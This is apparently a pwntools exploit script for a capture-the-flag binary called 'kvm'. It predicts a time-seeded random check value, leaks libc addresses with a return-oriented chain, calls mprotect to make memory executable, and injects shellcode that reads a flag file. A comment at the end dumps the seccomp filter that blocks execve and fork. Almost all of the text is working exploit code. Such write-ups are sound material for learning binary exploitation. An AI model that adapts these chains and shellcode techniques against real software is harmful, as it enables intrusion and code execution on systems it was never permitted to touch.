#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import ctypes
#  context.log_level = "debug"
context.binary = "./kvm"

elf = ELF("./kvm", checksec = False)
libc = ELF("./libc.so.6", checksec = False)
LIBC = ctypes.cdll.LoadLibrary("./libc.so.6")

def DEBUG():
    gdbcmd = '''
    b *0x401430
    c
    '''
    gdb.attach(io, gdbscript = gdbcmd)
    pause()



io = process("./kvm")
LIBC.srand(LIBC.time(0))

ipt = asm('''
        mov al, {}
        out (0xff), al
        mov al, {}
        out (0xff), al
        mov al, {}
        out (0xff), al
        mov al, {}
        out (0xff), al
        '''.format(ord('f'), ord('l'), ord('a'), ord('g')),
        )
io.sendlineafter(":", ipt)
sleep(0.01)

leak = flat(
        '0' * 0x58,
        LIBC.rand(),
        'xxxxxxxx',
        0x0000000000401583, # pop rdi; ret;
        elf.got['read'],
        elf.plt['puts'],
        0x4009D0            # _start
        )
io.sendlineafter("home!\n", leak)
sleep(0.01)
libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - libc.sym['read']
success("libc -> {:#x}".format(libc.address))


LIBC.srand(LIBC.time(0))
#  DEBUG()
io.sendlineafter(":", ipt)
sleep(0.01)

base = elf.bss() + 0x500 >> 12 << 12
payload = flat(
        '0' * 0x58,
        LIBC.rand(),
        'xxxxxxxx',
        libc.address + 0x000000000002155f, # pop rdi; ret;
        base,
        libc.address + 0x00000000001306d9, # pop rdx; pop rsi; ret;
        7,
        0x1000,
        libc.sym['mprotect'],


        libc.address + 0x000000000002155f, # pop rdi; ret;
        0,
        libc.address + 0x00000000001306d9, # pop rdx; pop rsi; ret;
        0x400,
        base,
        elf.plt['read'],
        base
        )
#  context.log_level = "debug"
io.sendlineafter("home!\n", payload)
sleep(0.01)

sc =  asm(shellcraft.open("./flag\0\0", 0))
sc += asm(shellcraft.read(9, elf.bss() + 0x500, 0x100))
sc += asm(shellcraft.write(1, elf.bss() + 0x500, 0x100))
sc = '\x90' * 20 + sc

# sc = asm('''
#         mov rax, {}
#         mov rdi, {}
#         mov rsi, {}
#         mov rdx, 0
#         syscall
#         '''.format(0x40000000 + 0x3b, base + 0x100, base + 0x108))
# sc = sc.ljust(0x100, "\0") + "/bin/ls\0" + p64(base + 0x100)

io.send(sc)

io.interactive()
'''
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0006
 0005: 0x06 0x00 0x00 0x00000000  return KILL
 0006: 0x15 0x00 0x01 0x00000142  if (A != execveat) goto 0008
 0007: 0x06 0x00 0x00 0x00000000  return KILL
 0008: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0010
 0009: 0x06 0x00 0x00 0x00000000  return KILL
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW

'''
